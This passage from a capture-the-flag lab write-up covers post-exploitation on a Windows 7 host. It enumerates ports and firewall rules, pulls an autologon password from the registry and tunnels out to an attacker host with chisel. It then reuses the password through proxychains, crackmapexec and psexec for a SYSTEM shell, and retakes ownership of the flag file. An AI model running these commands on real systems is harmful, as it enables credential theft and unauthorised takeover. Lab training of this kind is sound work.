  10.129.255.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.252           01-00-5e-00-00-fc     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static
```

The target is listening on several TCP and UDP ports.

```batch
C:\Windows\system32>netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       700
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       360
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       756
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       920
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       416
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       460
  TCP    10.129.254.227:139     0.0.0.0:0              LISTENING       4
  TCP    10.129.254.227:9255    0.0.0.0:0              LISTENING       2856
  TCP    10.129.254.227:9256    0.0.0.0:0              LISTENING       2856
  TCP    10.129.254.227:49157   10.10.14.139:443       ESTABLISHED     2856
  TCP    [::]:135               [::]:0                 LISTENING       700
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:49152             [::]:0                 LISTENING       360
  TCP    [::]:49153             [::]:0                 LISTENING       756
  TCP    [::]:49154             [::]:0                 LISTENING       920
  TCP    [::]:49155             [::]:0                 LISTENING       416
  TCP    [::]:49156             [::]:0                 LISTENING       460
  UDP    0.0.0.0:123            *:*                                    888
  UDP    0.0.0.0:500            *:*                                    920
  UDP    0.0.0.0:4500           *:*                                    920
  UDP    0.0.0.0:5355           *:*                                    1176
  UDP    0.0.0.0:56106          *:*                                    1176
  UDP    10.129.254.227:137     *:*                                    4
  UDP    10.129.254.227:138     *:*                                    4
  UDP    10.129.254.227:1900    *:*                                    3652
  UDP    10.129.254.227:9256    *:*                                    2856
  UDP    127.0.0.1:1900         *:*                                    3652
  UDP    127.0.0.1:50500        *:*                                    3652
  UDP    [::]:123               *:*                                    888
  UDP    [::]:500               *:*                                    920
  UDP    [::]:4500              *:*                                    920
  UDP    [::1]:1900             *:*                                    3652
  UDP    [::1]:50499            *:*                                    3652
```

The target isn't offering any non-standard SMB shares.

```batch
C:\Windows\system32>net share
net share

Share name   Resource                        Remark

-------------------------------------------------------------------------------
C$           C:\                             Default share
IPC$                                         Remote IPC
ADMIN$       C:\Windows                      Remote Admin
The command completed successfully.
```

### Defensive Countermeasure Enumeration

The target doesn't appear to have any antivirus products configured.

```batch
C:\Windows\system32>wmic /namespace:\\root\securitycenter2 path antivirusproduct
wmic /namespace:\\root\securitycenter2 path antivirusproduct
No Instance(s) Available.
```

The target's firewall is enabled.

```batch
C:\Windows\system32>netsh firewall show state
netsh firewall show state

Firewall status:
-------------------------------------------------------------------
Profile                           = Standard
Operational mode                  = Enable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Enable
Group policy version              = Windows Firewall
Remote admin mode                 = Disable

Ports currently open on all network interfaces:
Port   Protocol  Version  Program
-------------------------------------------------------------------
No ports are currently open on all network interfaces.

IMPORTANT: Command executed successfully.
However, "netsh firewall" is deprecated;
use "netsh advfirewall firewall" instead.
For more information on using "netsh advfirewall firewall" commands
instead of "netsh firewall", see KB article 947709
at http://go.microsoft.com/fwlink/?linkid=121488 .
```

The firewall only allows inbound connections related to AChat, which explains why initial port discovery didn't pick up many of the listening ports.

```batch
C:\Windows\system32>netsh firewall show config
netsh firewall show config

Domain profile configuration:
-------------------------------------------------------------------
Operational mode                  = Enable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Enable

Allowed programs configuration for Domain profile:
Mode     Traffic direction    Name / Program
-------------------------------------------------------------------

Port configuration for Domain profile:
Port   Protocol  Mode    Traffic direction     Name
-------------------------------------------------------------------

ICMP configuration for Domain profile:
Mode     Type  Description
-------------------------------------------------------------------
Enable   2     Allow outbound packet too big

Standard profile configuration (current):
-------------------------------------------------------------------
Operational mode                  = Enable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Enable

Service configuration for Standard profile:
Mode     Customized  Name
-------------------------------------------------------------------
Enable   No          Network Discovery

Allowed programs configuration for Standard profile:
Mode     Traffic direction    Name / Program
-------------------------------------------------------------------
Enable   Inbound              AChat - LAN chatting application / C:\program files\achat\achat.exe
Enable   Inbound              AChat - LAN chatting application / C:\program files\achat\achat.exe
Enable   Inbound              AChat - LAN chatting application / C:\program files\achat\achat.exe
Enable   Inbound              AChat - LAN chatting application / C:\program files\achat\achat.exe
Enable   Inbound              AChat - LAN chatting application / C:\program files\achat\achat.exe

Port configuration for Standard profile:
Port   Protocol  Mode    Traffic direction     Name
-------------------------------------------------------------------

ICMP configuration for Standard profile:
Mode     Type  Description
-------------------------------------------------------------------
Enable   2     Allow outbound packet too big

Log configuration:
-------------------------------------------------------------------
File location   = C:\Windows\system32\LogFiles\Firewall\pfirewall.log
Max file size   = 4096 KB
Dropped packets = Disable
Connections     = Disable

IMPORTANT: Command executed successfully.
However, "netsh firewall" is deprecated;
use "netsh advfirewall firewall" instead.
For more information on using "netsh advfirewall firewall" commands
instead of "netsh firewall", see KB article 947709
at http://go.microsoft.com/fwlink/?linkid=121488 .
```

---

## Privilege Escalation Enumeration as `alfred`

### Credential Hunting

There are no sysprep nor unattended installation files. There are no VNC configuration files.

`Alred`'s password is stored in the Autologon configuration: `Welcome1!`.

```batch
C:\Windows\system32>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    ShutdownWithoutLogon    REG_SZ    0
    WinStationsDisabled    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    scremoveoption    REG_SZ    0
    ShutdownFlags    REG_DWORD    0x11
    DefaultDomainName    REG_SZ
    DefaultUserName    REG_SZ    Alfred
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    Welcome1!

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\AutoLogonChecked
```

---

## Reusing `alfred`'s Password for Administrative Access

It is worth checking if `alfred`'s password is also `Administrator`'s. Generally, this could be done by attempting to authenticate to the target's SMB server. However, its firewall rules prevent external access to its SMB port. Establish a dynamic remote port forwarding tunnel through the target to establish a connection to its SMB server and check if `alfred`'s password is also `Administrator`'s.

Since the target's CPU architecture is x86, download the latest Windows i386 release of `chisel` from [here](https://github.com/jpillora/chisel/releases). Download the appropriate `chisel` release for the attacking machine as well.

Transfer the Windows i386 `chisel` binary to the target.

Start the `chisel` server on the attacking machine with the options that make it capable of establishing a dynamic reverse port forwarding tunnel.

```bash
$ ./chisel server --reverse --port 8000
2022/02/04 15:46:00 server: Reverse tunnelling enabled
2022/02/04 15:46:00 server: Fingerprint bG0zJq+9foizxPtGiJTuOj34fF0Ng45QTTOmzICcb4E=
2022/02/04 15:46:00 server: Listening on http://0.0.0.0:8000
```

Run the `chisel` client on the target to connect to the `chisel` server on the attacking machine and establish the tunnel. Note the successful establishment of the tunnel on the attacking machine.

```bash
c:\Users\Alfred\Downloads>.\chisel.exe client 10.10.14.139:8000 R:socks
.\chisel.exe client 10.10.14.139:8000 R:socks
2022/02/04 10:46:16 client: Connecting to ws://10.10.14.139:8000
2022/02/04 10:46:16 client: Connected (Latency 19.0011ms)
```

```bash
$ ./chisel server --reverse --port 8000
2022/02/04 15:46:00 server: Reverse tunnelling enabled
2022/02/04 15:46:00 server: Fingerprint bG0zJq+9foizxPtGiJTuOj34fF0Ng45QTTOmzICcb4E=
2022/02/04 15:46:00 server: Listening on http://0.0.0.0:8000
2022/02/04 15:46:16 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

On the attacking machine, use `proxychains` to check `alfred`'s password with the `Administrator` account through the dynamic reverse port forward tunnel.

```bash
$ proxychains crackmapexec smb 10.129.218.19 --local-auth -u Administrator -p 'Welcome1!'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.218.19:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.218.19:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.218.19:445  ...  OK
SMB         10.129.218.19   445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:CHATTERBOX) (signing:False) (SMBv1:True)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.218.19:445  ...  OK
SMB         10.129.218.19   445    CHATTERBOX       [+] CHATTERBOX\Administrator:Welcome1! (Pwn3d!)
```

The password works! Use `impacket-psexec` to gain a shell as `NT AUTHORITY\SYSTEM`.

```bash
$ proxychains impacket-psexec Administrator:'Welcome1!'@10.129.218.19
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] DLL init: proxychains-ng 4.14
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.218.19:445  ...  OK
[*] Requesting shares on 10.129.218.19.....
[*] Found writable share ADMIN$
[*] Uploading file DajpBUtB.exe
[*] Opening SVCManager on 10.129.218.19.....
[*] Creating service JWSf on 10.129.218.19.....
[*] Starting service JWSf.....
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.218.19:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.218.19:445  ...  OK
[!] Press help for extra shell commands
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.218.19:445  ...  OK
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

---

## Reading the System Flag

Interestingly, `NT AUTHORITY\SYSTEM` doesn't have permission to read the system flag at `C:\Users\Administrator\Desktop\root.txt`.

```batch
c:\Users\Administrator\Desktop>type C:\Users\Administrator\Desktop\root.txt
b'Access is denied.\r\n'
```

`NT AUTHORITY\SYSTEM` doesn't have ownership of the flag file.

```batch
c:\Users\Administrator\Desktop>dir /q C:\Users\Administrator\Desktop\root.txt
 Volume in drive C has no label.
 Volume Serial Number is 9034-6528

 Directory of C:\Users\Administrator\Desktop

02/04/2022  11:23 AM                34 ...                    root.txt
               1 File(s)             34 bytes
               0 Dir(s)  19,611,602,944 bytes free
```

Take ownership of it.

```batch
c:\Users\Administrator\Desktop>takeown /f C:\Users\Administrator\Desktop\root.txt

SUCCESS: The file (or folder): "c:\Users\Administrator\Desktop\root.txt" now owned by user "WORKGROUP\CHATTERBOX$".
```

Grant `NT AUTHORITY\SYSTEM` read access to it and read the flag.

```batch
c:\Users\Administrator\Desktop>icacls C:\Users\Administrator\Desktop\root.txt /grant "NT AUTHORITY\SYSTEM":(R)
processed file: root.txt
Successfully processed 1 files; Failed processing 0 files
```
